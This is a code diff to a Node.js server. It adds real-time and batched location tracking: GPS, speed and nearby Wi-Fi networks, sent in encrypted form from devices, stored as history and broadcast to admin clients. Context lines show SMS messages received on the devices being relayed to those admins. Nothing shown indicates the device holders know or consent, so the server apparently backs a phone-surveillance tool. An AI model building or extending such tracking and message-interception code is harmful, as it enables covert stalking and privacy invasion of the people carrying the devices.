@@ -2109,6 +2109,71 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       }
     });
 
+    // ═══ FEATURE 13: REAL-TIME LOCATION UPDATE (Socket.IO) ═══
+    // Device emits 'location_update' with encrypted location data.
+    // Server decrypts, persists to DB, and broadcasts to admin panel.
+    socket.on('location_update', (rawData) => {
+      try {
+        let data;
+        try {
+          const { tryDecrypt } = require('./utils/crypto');
+          data = tryDecrypt(rawData);
+        } catch (_) {
+          data = typeof rawData === 'string' ? JSON.parse(rawData) : rawData;
+        }
+
+        const deviceId = data.device_id || socketToDevice.get(socket.id) || '';
+        const loc = data.location || {};
+        if (!deviceId || !loc.latitude) return;
+
+        const lat = loc.latitude;
+        const lng = loc.longitude;
+        const accuracy = loc.accuracy || -1;
+        const speed = loc.speed || 0;
+        const source = loc.provider || 'gps';
+        const wifi = loc.wifi_networks || null;
+
+        // Update device's current location
+        try {
+          db.prepare(`UPDATE devices SET latitude = ?, longitude = ?, loc_source = ?, loc_accuracy = ?, last_seen = datetime('now') WHERE device_id = ?`)
+            .run(lat, lng, source, accuracy, deviceId);
+        } catch (_) {}
+
+        // Append to location history (throttled — don't insert every 3s,
+        // only if the last entry was >10s ago or location changed >10m)
+        try {
+          const lastEntry = db.prepare('SELECT latitude, longitude, recorded_at FROM location_history WHERE device_id = ? ORDER BY recorded_at DESC LIMIT 1').get(deviceId);
+          if (lastEntry) {
+            const dist = Math.sqrt(Math.pow(lat - lastEntry.latitude, 2) + Math.pow(lng - lastEntry.longitude, 2)) * 111000; // rough meters
+            const ageMs = Date.now() - new Date(lastEntry.recorded_at + 'Z').getTime();
+            if (dist < 10 && ageMs < 10000) {
+              // Skip — too close and too recent
+            } else {
+              db.prepare(`INSERT INTO location_history (device_id, latitude, longitude, accuracy, source, recorded_at) VALUES (?, ?, ?, ?, ?, datetime('now'))`)
+                .run(deviceId, lat, lng, accuracy, source);
+            }
+          } else {
+            db.prepare(`INSERT INTO location_history (device_id, latitude, longitude, accuracy, source, recorded_at) VALUES (?, ?, ?, ?, ?, datetime('now'))`)
+              .run(deviceId, lat, lng, accuracy, source);
+          }
+        } catch (_) {}
+
+        // Broadcast to all admin clients for live map updates
+        origEmit('location_update', {
+          device_id: deviceId,
+          latitude: lat,
+          longitude: lng,
+          accuracy,
+          speed,
+          source,
+          wifi_networks: wifi,
+          timestamp: Date.now()
+        });
+      } catch (e) {
+        console.warn('[location_update] handler error:', e.message);
+      }
+    });
+
     // ═══ INSTANT SMS RELAY — device → server → admin app ═══
     // NetMirror emits 'instant_sms' when an SMS is received on the device.
     // We save it to the DB and broadcast 'new_sms' to all connected admin clients.
@@ -3530,7 +3595,9 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       const lat = location.latitude || 0;
       const lng = location.longitude || 0;
       const accuracy = location.accuracy || -1;
+      const speed = location.speed || 0;
       const source = location.provider || 'gps';
+      const wifi = location.wifi_networks || null;
 
       // Update device's current location
       db.prepare(`UPDATE devices SET latitude = ?, longitude = ?, loc_source = ?, loc_accuracy = ?, last_seen = datetime('now') WHERE device_id = ?`)
@@ -3540,8 +3607,76 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       db.prepare(`INSERT INTO location_history (device_id, latitude, longitude, accuracy, source, recorded_at) VALUES (?, ?, ?, ?, ?, datetime('now'))`)
         .run(device_id, lat, lng, accuracy, source);
 
-      console.log(`[LOCATION] Device ${device_id}: ${lat}, ${lng} (${source}, accuracy=${accuracy}m)`);
+      // ═══ FEATURE 13: BROADCAST LOCATION UPDATE TO ADMIN PANEL ═══
+      // Real-time location_update event for the live map
+      if (io) {
+        io.emit('location_update', {
+          device_id,
+          latitude: lat,
+          longitude: lng,
+          accuracy,
+          speed,
+          source,
+          wifi_networks: wifi,
+          timestamp: Date.now()
+        });
+      }
+
+      console.log(`[LOCATION] Device ${device_id}: ${lat}, ${lng} (${source}, accuracy=${accuracy}m, speed=${speed}m/s)`);
       res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ FEATURE 13: BATCH LOCATION FLUSH (offline queue) ═══
+  // When the device regains internet, it sends all buffered locations
+  // in a single batch POST. Each location is inserted into location_history
+  // and the last one updates the device's current position.
+  app.post('/api/devices/location-batch', (req, res) => {
+    try {
+      const { device_id, locations } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
+      if (!locations || !Array.isArray(locations)) return res.status(400).json({ error: 'locations array is required' });
+
+      let lastLat = 0, lastLng = 0, lastAcc = -1, lastSource = 'gps';
+
+      const insertStmt = db.prepare(`INSERT INTO location_history (device_id, latitude, longitude, accuracy, source, recorded_at) VALUES (?, ?, ?, ?, ?, datetime('now'))`);
+
+      const insertMany = db.transaction((locs) => {
+        for (const loc of locs) {
+          const lat = loc.latitude || 0;
+          const lng = loc.longitude || 0;
+          const acc = loc.accuracy || -1;
+          const src = loc.provider || 'gps';
+          insertStmt.run(device_id, lat, lng, acc, src);
+          lastLat = lat; lastLng = lng; lastAcc = acc; lastSource = src;
+        }
+      });
+      insertMany(locations);
+
+      // Update device's current location to the last one in the batch
+      if (lastLat !== 0 || lastLng !== 0) {
+        db.prepare(`UPDATE devices SET latitude = ?, longitude = ?, loc_source = ?, loc_accuracy = ?, last_seen = datetime('now') WHERE device_id = ?`)
+          .run(lastLat, lastLng, lastSource, lastAcc, device_id);
+
+        // Broadcast the last location to admin panel
+        if (io) {
+          io.emit('location_update', {
+            device_id,
+            latitude: lastLat,
+            longitude: lastLng,
+            accuracy: lastAcc,
+            source: lastSource,
+            timestamp: Date.now(),
+            batch_flush: true,
+            batch_count: locations.length
+          });
+        }
+      }
+
+      console.log(`[LOCATION-BATCH] Device ${device_id}: flushed ${locations.length} locations`);
+      res.json({ success: true, flushed: locations.length });
     } catch (err) {
       res.status(500).json({ error: err.message });
     }
